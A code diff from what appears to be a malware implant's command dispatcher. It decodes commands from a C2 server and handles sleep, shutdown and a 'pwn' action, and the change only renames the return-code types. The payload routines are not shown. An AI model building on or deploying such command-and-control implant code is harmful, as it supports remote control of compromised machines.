@@ -6,7 +6,7 @@
 #include "../program/program.h"
 
 // private method prototypes
-static ERR_CODE executeCommand(char* cmdStr, unsigned char key);
+static RET_CODE executeCommand(char* cmdStr, unsigned char key);
 static void doSleep(int n);
 static void doPawn();
 static int extractN(char* cmdStr);
@@ -17,28 +17,28 @@ static int extractN(char* cmdStr);
  * NOTE: if we detect the commands were incorectly encoded its likely due to the C2
  * being spoofed, as such do not execute them!
  */
-ERR_CODE processCommands(CLIENT_HANDLER* client) {
+RET_CODE processCommands(CLIENT_HANDLER* client) {
     char* saveState;
     char* line = strtok_r(client->cmdBuffer, "\n", &saveState);
     
     // we check for shutdown here in case theere are commands after the shd
     while (line != NULL) {
-        ERR_CODE ret = executeCommand(line, ctx->__KEY__);
+        RET_CODE ret = executeCommand(line, ctx->__KEY__);
 
         // if shutdown, or the commands were incorrectly encoded then exit!
-        if (ret == ECODE_DO_SHUTDOWN)   { return ECODE_DO_SHUTDOWN; }
-        if (ret == ECODE_INCORRECT_ENC) { return ECODE_INCORRECT_ENC; }
+        if (ret == R_DO_SHUTDOWN)   { return R_DO_SHUTDOWN; }
+        if (ret == R_INCORRECT_ENC) { return R_INCORRECT_ENC; }
 
         line = strtok_r(NULL, "\n", &saveState);
     }
-    return ECODE_SUCCESS;
+    return R_SUCCESS;
 }
 
 /**
  * Takes a single command, matching the given action and generating a new 
  * COMMAND struct. Then dispatches command execute before freeing the memory again
  */
-static ERR_CODE executeCommand(char* cmdStr, unsigned char key) {
+static RET_CODE executeCommand(char* cmdStr, unsigned char key) {
     encode(cmdStr, &key);
     
     if (strncmp(cmdStr, "slp", 3) == 0) {
@@ -46,18 +46,18 @@ static ERR_CODE executeCommand(char* cmdStr, unsigned char key) {
         doSleep(extractN(cmdStr + 3));
         ctx->sleeping = FALSE;
 
-        return ECODE_SUCCESS;
+        return R_SUCCESS;
     } 
     if (strncmp(cmdStr, "shd", 3) == 0) {
         ctx->shutdown = TRUE;
-        return ECODE_DO_SHUTDOWN;
+        return R_DO_SHUTDOWN;
     } 
     if (strncmp(cmdStr, "pwn", 3) == 0) {
         doPawn();
-        return ECODE_SUCCESS;
+        return R_SUCCESS;
     }
     
-    return ECODE_INCORRECT_ENC; 
+    return R_INCORRECT_ENC; 
 }
 
 /**
